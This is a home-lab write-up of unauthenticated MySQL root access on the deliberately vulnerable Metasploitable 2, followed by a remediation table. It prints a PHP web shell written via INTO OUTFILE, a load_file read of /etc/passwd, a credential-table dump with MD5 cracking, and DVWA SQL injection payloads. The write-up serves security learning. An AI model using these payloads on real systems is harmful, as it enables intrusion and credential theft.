# MySQL Port 3306 — Unauthenticated Root Access & Credential Extraction

**Target:** Metasploitable 2  
**Date:** May 2026  
**Author:** Kavinsuriya N G  
**Type:** Home Lab — Deliberate Practice  
**Difficulty:** Beginner  

---

## Table of Contents

1. [Environment](#environment)
2. [Summary](#summary)
3. [Findings Overview](#findings-overview)
4. [Step-by-Step Walkthrough](#step-by-step-walkthrough)
   - [Step 1 — Port Discovery](#step-1--port-discovery)
   - [Step 2 — MySQL Connection](#step-2--mysql-connection)
   - [Step 3 — Orientation Queries](#step-3--orientation-queries)
   - [Step 4 — Auth Database Enumeration](#step-4--auth-database-enumeration)
   - [Step 5 — Privilege Verification](#step-5--privilege-verification)
   - [Step 6 — Application Database Dump](#step-6--application-database-dump)
   - [Step 7 — FILE Privilege Testing](#step-7--file-privilege-testing)
   - [Step 8 — Offline Password Cracking](#step-8--offline-password-cracking)
   - [Step 9 — Web Application Login](#step-9--web-application-login)
   - [Step 10 — SQL Injection via DVWA](#step-10--sql-injection-via-dvwa)
5. [Errors & Fixes Encountered](#errors--fixes-encountered)
6. [Findings Detail](#findings-detail)
7. [Attack Chain Summary](#attack-chain-summary)
8. [Remediation](#remediation)
9. [Lessons Learned](#lessons-learned)

---

## Environment

| Item | Detail |
|---|---|
| Attacker | Kali Linux 2026.1 — 192.168.56.102 |
| Target | Metasploitable 2 — 192.168.56.101 |
| Network | VirtualBox Host-Only Adapter — isolated lab |
| Tools Used | nmap, mysql client, john, rockyou.txt, Firefox |
| Platform | Metasploitable 2 (deliberately vulnerable VM) |

> **Disclaimer:** This assessment was performed entirely in an isolated home lab on Metasploitable 2 — a VM designed specifically for security practice. Never perform these techniques on systems you do not own or have explicit permission to test.

---

## Summary

Metasploitable 2 was running MySQL 5.0.51a with port 3306 bound to `0.0.0.0`, an unauthenticated root account, and `Host=%` accepting connections from any IP. These three misconfigurations combined allowed full unauthenticated remote root access to the database server.

From this single entry point I was able to:
- Enumerate the entire database structure
- Dump all application user credentials
- Crack MD5 password hashes offline in under 3 seconds
- Log into the DVWA web application as admin
- Perform manual SQL injection inside DVWA

No exploits were used. No Metasploit. Manual enumeration only throughout.

---

## Findings Overview

| ID | Finding | Severity | CVSS |
|---|---|---|---|
| F-01 | MySQL port 3306 exposed to network | Critical | 10.0 |
| F-02 | Root account has no password | Critical | 10.0 |
| F-03 | Host=% accepts connections from any IP | Critical | 10.0 |
| F-04 | Anonymous guest account with no password | High | 8.5 |
| F-05 | FILE privilege enabled on root@% | High | 7.5 |
| F-06 | Application passwords stored as unsalted MD5 | High | 7.5 |
| F-07 | DVWA SQL Injection — unsanitized user input | High | 8.0 |

---

## Step-by-Step Walkthrough

### Step 1 — Port Discovery

**Goal:** Identify MySQL service and version on the target.

```bash
nmap -sV -p 3306 192.168.56.101
```

**Result:**
```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5
```

**What this tells us:**  
MySQL is running and publicly accessible. Version 5.0.51a is from 2008 — outdated and lacking modern TLS support. This version number directly indicates potential vulnerabilities and confirmed the need for `--ssl=0` on connection.

---

### Step 2 — MySQL Connection

**Goal:** Connect to MySQL as root.

**First attempt — TLS error:**
```bash
mysql -h 192.168.56.101 -u root
```
```
ERROR 2026 (HY000): TLS/SSL error: wrong version number
```

**Why:** Modern Kali MySQL client (compiled against OpenSSL 3.x) attempts TLS negotiation by default. MySQL 5.0.51a does not support TLS 1.2 or higher — version mismatch causes handshake failure before authentication.

**Fix — disable SSL negotiation:**
```bash
mysql -h 192.168.56.101 -u root --ssl=0
```
```
Welcome to the MariaDB monitor.
Server version: 5.0.51a-3ubuntu5 (Ubuntu)
```

**Access granted with no password.**

---

### Step 3 — Orientation Queries

**Goal:** Confirm access level, version, and current context.

```sql
SELECT version(), user(), database();
```

```
+-----------------+----------------------+------------+
| version()       | user()               | database() |
+-----------------+----------------------+------------+
| 5.0.51a-3ubuntu5| root@192.168.56.102  | NULL       |
+-----------------+----------------------+------------+
```

**Key observations:**
- Connected as `root@192.168.56.102` — root user from remote IP
- `NULL` database — no default database selected (expected)
- Version confirmed — 5.0.51a maps to multiple known CVEs

```sql
SHOW databases;
```

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| dvwa               |
| metasploit         |
| mysql              |
| owasp10            |
| tikiwiki           |
| tikiwiki195        |
+--------------------+
7 rows in set
```

7 databases found. Multiple application databases accessible under a single root credential.

---

### Step 4 — Auth Database Enumeration

**Goal:** Read MySQL's own authentication database to map all accounts.

```sql
USE mysql;
SELECT Host, User, Password FROM user;
```

```
+------+--------------------+----------+
| Host | User               | Password |
+------+--------------------+----------+
|      | debian-sys-maint   |          |
| %    | root               |          |
| %    | guest              |          |
+------+--------------------+----------+
3 rows in set
```

**Critical findings:**
- `root@%` — root account accessible from any IP, empty password
- `guest@%` — anonymous account accessible from any IP, empty password
- `Host=%` — wildcard accepts connections from every IP address on the network

**Note:** During this step I encountered a typo error:
```sql
-- WRONG (dot instead of comma):
SELECT Host, User.Password FROM user;
-- ERROR 1054: Unknown column 'User.Password'

-- CORRECT:
SELECT Host, User, Password FROM user;
```

---

### Step 5 — Privilege Verification

**Goal:** Confirm the exact privileges available on the current session.

```sql
SHOW GRANTS FOR 'root'@'%';
```

```
+------------------------------------------------------------------+
| GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION     |
+------------------------------------------------------------------+
```

**Analysis:**
- `ALL PRIVILEGES ON *.*` — every permission on every database
- `WITH GRANT OPTION` — can assign these privileges to other accounts
- `ALL PRIVILEGES` includes `FILE` — confirmed filesystem read/write capability

---

### Step 6 — Application Database Dump

**Goal:** Extract user credentials from the DVWA application database.

```sql
USE dvwa;
SHOW tables;
```
```
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
```

```sql
SELECT * FROM users;
```

```
+---------+------------+-----------+---------+----------------------------------+
| user_id | first_name | last_name | user    | password                         |
+---------+------------+-----------+---------+----------------------------------+
|       1 | admin      | admin     | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 |
|       2 | Gordon     | Brown     | gordonb | e99a18c428cb38d5f260853678922e03 |
|       3 | Hack       | Me        | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b |
|       4 | Pablo      | Picasso   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 |
|       5 | Bob        | Smith     | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 |
+---------+------------+-----------+---------+----------------------------------+
5 rows in set
```

**Observations:**
- All passwords stored as raw unsalted MD5 — no bcrypt, no salt
- `admin` and `smithy` share the identical hash — same password
- These are application-layer credentials stored in the database

---

### Step 7 — FILE Privilege Testing

**Goal:** Test filesystem read/write via FILE privilege.

**Read test:**
```sql
SELECT load_file('/etc/passwd');
```
Returned `/etc/passwd` contents — confirmed read access.

**Write test — web root (failed):**
```sql
SELECT '<?php system($_GET["cmd"]); ?>' 
INTO OUTFILE '/var/www/dvwa/shell.php';
-- ERROR 1 (HY000): Can't create/write to file (Errcode: 13)
```

**Why it failed:** Errcode 13 = Linux Permission Denied. MySQL runs as the `mysql` OS user. `/var/www/` is owned by `www-data`. The mysql user cannot write to www-data's directories — OS-level privilege separation working correctly.

**Write test — /tmp (succeeded):**
```sql
SELECT '<?php system($_GET["cmd"]); ?>' 
INTO OUTFILE '/tmp/shell.php';
-- Query OK, 1 row affected
```

**Conclusion:** FILE privilege is active. Web shell via INTO OUTFILE requires writable web directory. The attack chain is blocked by correct file ownership — a working defense. Finding documented as partial success.

**Security note:** On a server where MySQL runs as root or where web directories are world-writable, this would result in full Remote Code Execution.

---

### Step 8 — Offline Password Cracking

**Goal:** Crack the extracted MD5 hashes using John the Ripper.

**Hash file (hash.txt):**
```
5f4dcc3b5aa765d61d8327deb882cf99
```

**Crack command:**
```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
No password hashes left to crack (see FAQ)
```

**Show results:**
```bash
john --show --format=Raw-MD5 hash.txt
```
```
?:password

1 password hash cracked, 0 left
```

**Result:** `admin` hash cracked to **"password"** in under 3 seconds.

**Key learning:** `--format=Raw-MD5` must be specified explicitly. Unlike shadow file hashes which carry format identifiers ($6$, $1$), raw MD5 is just 32 hex characters with no prefix — John cannot auto-detect it.

**Errors encountered during this step:**

| Command typed | Error | Cause |
|---|---|---|
| `--format=Raw-MD5--wordlist=` | Unknown ciphertext format | Missing space between flags |
| `--show--format=Raw-MD5` | Unknown option | Missing space between flags |

Both errors caused by missing spaces between flags. Standard terminal discipline issue.

---

### Step 9 — Web Application Login

**Goal:** Use cracked credentials to access DVWA.

```
URL:      http://192.168.56.101/dvwa/login.php
Username: admin
Password: password
```

**Result:** Successful login as admin.

**What this demonstrates:** No exploit needed at the web layer. Credential dump from database + offline cracking + valid login = authenticated access. From the server's perspective this looks like a legitimate login — no attack traffic at the web layer.

---

### Step 10 — SQL Injection via DVWA

**Goal:** Perform manual SQL injection through DVWA's web interface without automated tools.

**Location:** DVWA → SQL Injection → Security Level: Low

**Step 1 — Normal input:**
```
Input: 1
Result: Shows user ID 1 details (normal behavior)
```

**Step 2 — Injection test:**
```
Input: 1'
Result: SQL syntax error displayed
```
Error confirms input goes directly into SQL query without sanitization. Injectable confirmed.

**Step 3 — Column count:**
```
Input: 1' ORDER BY 2-- -   → Works
Input: 1' ORDER BY 3-- -   → Error
```
Column count = 2.

**Step 4 — UNION SELECT credential extraction:**
```
Input: 0' UNION SELECT user, password FROM users-- -
```
```
Result:
First name: admin    Surname: 5f4dcc3b5aa765d61d8327deb882cf99
First name: gordonb  Surname: e99a18c428cb38d5f260853678922e03
First name: 1337     Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
First name: pablo    Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
First name: smithy   Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

**Same credentials extracted through web form as via direct MySQL connection.**

**Why `0` instead of `1`:** User ID 0 does not exist. Using a non-existent ID means the first SELECT returns nothing, making the UNION SELECT results visible. Using ID 1 caused the real user record to appear first and mask the injected results.

---

## Errors & Fixes Encountered

| Error | Cause | Fix |
|---|---|---|
| TLS/SSL wrong version number | Modern client, old server TLS mismatch | Add `--ssl=0` flag |
| Unknown column 'User.Password' | Dot instead of comma between column names | `User,Password` not `User.Password` |
| load_file() returns NULL | FILE privilege on root@% differs from root@localhost | Run `SHOW GRANTS` to verify, connect locally |
| INTO OUTFILE Errcode 13 | MySQL user cannot write to www-data owned directories | /tmp write confirmed FILE works — web dir needs chmod |
| SSH host key mismatch | Modern Kali rejects old ssh-rsa algorithm | `ssh -oHostKeyAlgorithms=+ssh-rsa msfadmin@target` |
| John "Unknown ciphertext format" | Missing space: `--format=Raw-MD5--wordlist` | Space between every flag |
| DVWA 404 on login | Comma instead of dot: `login,php` | `login.php` not `login,php` |
| UNION SELECT showed nothing | Used ID=1 which exists, hid UNION results | Use `0'` — non-existent ID shows only UNION output |

---

## Findings Detail

### F-01, F-02, F-03 — The Three Stacked Misconfigurations

These three findings together created the critical attack surface. Each alone is bad. All three together = unauthenticated remote root access.

```
Misconfiguration 1: bind-address = 0.0.0.0
→ Port 3306 reachable from any machine on the network

Misconfiguration 2: root password = (empty)
→ No authentication barrier

Misconfiguration 3: Host = %
→ Any IP address can attempt to connect
```

Remove any one → attack stops.

### F-05 — FILE Privilege

The `FILE` privilege allows MySQL to read any file the MySQL OS user can read (`load_file()`), and write files anywhere the MySQL OS user has write permission (`INTO OUTFILE`).

On this target, read access to `/etc/passwd` was confirmed. Write access to web directories was blocked by correct file ownership — however write to `/tmp/` succeeded, confirming the privilege is active.

### F-06 — Unsalted MD5 Password Storage

Raw MD5 without salt is broken for password storage:
- No salt means identical passwords produce identical hashes (admin and smithy confirmed)
- MD5 is not a password hashing function — it was designed for speed, making brute force trivial
- Entire DVWA user table cracked in under 3 seconds with rockyou.txt
- Modern standard: bcrypt, Argon2, or scrypt with per-user salt

---

## Attack Chain Summary

```
Nmap scan → port 3306 open (MySQL 5.0.51a)
        ↓
mysql -u root --ssl=0 → access granted, no password
        ↓
SHOW databases → 7 databases mapped
        ↓
USE mysql → SELECT Host,User,Password FROM user
         → root@%, guest@% with empty passwords
        ↓
SHOW GRANTS → ALL PRIVILEGES confirmed including FILE
        ↓
USE dvwa → SELECT * FROM users
         → 5 accounts + MD5 hashes extracted
        ↓
john --format=Raw-MD5 + rockyou.txt
         → admin:password cracked in <3 seconds
        ↓
http://target/dvwa/login.php → admin:password
         → authenticated web application access
        ↓
DVWA SQL Injection → UNION SELECT credential dump
         → same hashes extracted via web form
```

**Total time from port discovery to web app login: ~45 minutes**  
(Including troubleshooting all errors documented above)

---

## Remediation

| Finding | Fix |
|---|---|
| Port 3306 exposed | Set `bind-address = 127.0.0.1` in my.cnf — MySQL should only listen on localhost |
| No root password | `ALTER USER 'root'@'%' IDENTIFIED BY 'strong_password';` |
| Host=% | Change to `Host=localhost` or specific trusted IP only |
| Guest account | `DROP USER ''@'%';` |
| FILE privilege | `REVOKE FILE ON *.* FROM 'root'@'%';` — only grant if explicitly required |
| MD5 passwords | Re-hash all passwords using bcrypt or Argon2 with per-user salt |
| SQL injection | Use prepared statements / parameterized queries — never concatenate user input into SQL |

**Most important single fix:** `bind-address = 127.0.0.1` in `/etc/mysql/my.cnf` followed by service restart. This eliminates the entire external attack surface in one change.

---

## Lessons Learned

**1. Misconfigurations chain.**  
Each individual finding was bad. All three together created a critical path. Real security assessments should look for how misconfigurations combine, not just list them individually.

**2. Manual before automation.**  
Everything in this writeup was done without Metasploit, sqlmap, or automated scanners. Understanding what each command does and why builds methodology that tools don't teach.

**3. OS-level privilege separation is a real defense.**  
MySQL not running as root blocked the web shell chain. This is the `mysql:x:109:118` entry in `/etc/passwd` — MySQL has its own non-privileged user. One correct configuration saved the server from full RCE.

**4. Same credentials, two attack paths.**  
The DVWA user table was reachable both via direct MySQL connection (port 3306) AND via SQL injection in the web form. Two completely different attack paths, identical result. Defense must cover both.

**5. Speed of offline cracking.**  
MD5 hashes cracked in under 3 seconds. This is why password storage algorithm matters more than password complexity at the database level. A strong password in MD5 is still weak if the database is dumped.

---



*Metasploitable 2 is purpose-built for security education.*  
*All techniques documented here were performed in an isolated VirtualBox lab environment.*  
*Author: Kavinsuriya  | Self-learning cybersecurity 
